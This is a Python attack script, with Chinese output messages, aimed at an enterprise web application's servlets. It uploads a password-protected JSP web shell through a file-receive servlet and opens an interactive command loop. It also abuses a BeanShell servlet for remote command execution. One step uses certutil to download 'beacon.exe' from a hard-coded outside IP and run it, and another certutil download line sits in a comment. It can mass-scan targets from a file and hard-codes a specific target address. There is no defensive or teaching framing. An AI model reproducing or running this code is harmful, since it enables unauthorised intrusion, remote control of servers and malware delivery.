import traceback

import requests
import threadpool
import urllib3

from utils import print_suc, print_err, print_inf

urllib3.disable_warnings()
proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://google.com",
}


def multithreading(funcname, filename="url.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")]
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()


def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")
        return vurl


# certutil -urlcache -split -f http://114.55.85.235:8000/ew-master/TencentQQ.exe
def doUrl(u):
    if 'http://' in u or 'https://' in u:
        pass
    else:
        u = 'http://%s' % u
    if u[-1] == '/':
        u[-1] = ''
    return u


def exp1(u):
    u = doUrl(u)
    uploadHeader = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Content-Type": "multipart/form-data;",
        "Referer": "https://google.com"
    }
    uploadData = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61" \
                 "\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f" \
                 "\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77" \
                 "\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09" \
                 "\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f" \
                 "\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78 "
    shellFlag = '<%@ page language="java" pageEncoding="GB2312"%><% if("@($VTW*RRT(UPPV*EWHPva38rwV78R89".equals(request.getParameter("pwd"))){ ' \
                'java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int ' \
                'a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new ' \
                'String(b)); } out.print("</pre>"); } %> '
    print(shellFlag)
    uploadData += shellFlag
    try:
        req1 = requests.post(u + "/servlet/FileReceiveServlet", headers=uploadHeader, verify=False, data=uploadData,
                             timeout=25)
        if req1.status_code == 200:
            print_suc('%s有上传漏洞' % u)
            i = 0
            while True:
                i += 1
                if i > 5:
                    break
                print_inf('尝试上传')
                req3 = requests.get(u + "/t00ls.jsp", headers=header, verify=False, timeout=25)
                if req3.status_code == 200:
                    print_suc('上传成功')
                    while True:
                        shell = input('OS-SHELL-COMMAND>>')
                        r = requests.get('%s/t00ls.jsp?pwd=@($VTW*RRT(UPPV*EWHPva38rwV78R89&i=%s' % (u, shell))
                        r.encoding = 'GB2312'
                        print(r.text)
            print_err('上传失败')
            return False
    except:
        print_err('%s没有上传漏洞' % u)
        return False


def exp2(u):
    u = doUrl(u)
    try:
        'bsh.script=exec%28%22cmd+%2Fc+whoami%22%29%3B%0D%0A%0D%0A&bsh.servlet.output=raw'
        shell = 'whoami'
        datas = {
            'bsh.script': 'exec("cmd /c %s");' % shell,
            'bsh.servlet.output': 'raw'
        }
        r = requests.post('%s/servlet/~ic/bsh.servlet.BshServlet' % u, data=datas)
        if r.status_code == 200:
            print_suc('%s有RCE漏洞' % u)
            print_suc(r.text)
            shell = 'certutil -urlcache -split -f http://114.55.85.235:8000/beacon.exe rundll32.exe'
            datas = {
                'bsh.script': 'exec("cmd /c %s");' % shell,
                'bsh.servlet.output': 'raw'
            }
            print_suc(requests.post('%s/servlet/~ic/bsh.servlet.BshServlet' % u, data=datas).text)
            shell = 'rundll32.exe'
            datas = {
                'bsh.script': 'exec("cmd /c %s");' % shell,
                'bsh.servlet.output': 'raw'
            }
            print_suc(requests.post('%s/servlet/~ic/bsh.servlet.BshServlet' % u, data=datas).text)
            # while True:
            #     shell = input('OS-SHELL-COMMAND>>')
            #     datas = {
            #         'bsh.script': 'exec("cmd /c %s");' % str(shell),
            #         'bsh.servlet.output': 'raw'
            #     }
            #     r = requests.post('%s/servlet/~ic/bsh.servlet.BshServlet' % u, data=datas)
            #     r.encoding = 'GB2312'
            #     print(r.text)
        else:
            print_err('%s没有RCE漏洞' % u)
            return False
    except:
        traceback.print_exc()
        print_err('未连通')
        return False


def attack(u):
    exp1(u)
    exp2(u)


if __name__ == "__main__":
    url = 'http://218.62.13.218:9080'
    attack(url)
